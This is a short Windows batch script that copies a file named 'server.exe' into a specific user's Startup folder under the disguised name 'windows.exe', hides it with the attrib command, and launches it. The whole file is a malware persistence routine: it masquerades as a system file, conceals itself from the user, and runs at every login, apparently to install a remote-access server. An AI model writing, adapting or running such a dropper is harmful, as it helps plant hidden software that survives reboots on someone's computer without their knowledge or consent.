@echo off
set sourceFilePath="server.exe"
set destFolder="C:\Users\aaryeh27\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set newFileName="windows.exe"

:: Copy the file to the destination folder
copy %sourceFilePath% %destFolder%\%newFileName%

:: Make the file hidden
attrib +h "%destFolder%\%newFileName%"

:: Open the file
start "" "%destFolder%\%newFileName%"